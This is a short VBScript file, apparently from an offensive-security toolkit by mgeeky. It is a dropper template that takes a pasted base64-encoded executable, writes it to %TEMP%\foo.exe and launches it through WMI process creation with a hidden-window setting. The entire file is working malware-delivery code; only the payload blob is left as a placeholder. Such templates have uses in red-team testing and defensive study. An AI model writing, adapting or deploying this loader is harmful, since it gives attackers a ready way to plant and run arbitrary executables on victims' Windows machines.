'
' Example of dropping an embedded, base64 encoded binary file to the disk,
' decoding it and then launching.
'
' Mariusz Banach / mgeeky, <mb@binary-offensive.com>
' (https://github.com/mgeeky)
'

saveFileAs = "%TEMP%\foo.exe"
launchParameters = ""

' =============================================================

fileBuffer = "<PASTE-HERE-YOUR-BASE64-ENCODED-BLOB>"

' =============================================================

Function Base64Decode(ByVal vCode)
    Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
End Function

Dim sh: Set sh = CreateObject("WScript.Shell")
out = sh.ExpandEnvironmentStrings(saveFileAs)

With CreateObject("Adodb.Stream")
    .Open
    .Type = 1
    .write Base64Decode(fileBuffer)
    .savetofile out, 2
End With

computer   = "."
Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" _
        & computer & "\root\cimv2")

Set startup = wmi.Get("Win32_ProcessStartup")
Set conf = startup.SpawnInstance_
conf.ShowWindow = 12

Set proc = GetObject("winmgmts:root\cimv2:Win32_Process")

command = out & " " & launchParameters
proc.Create command, Null, conf, intProcessID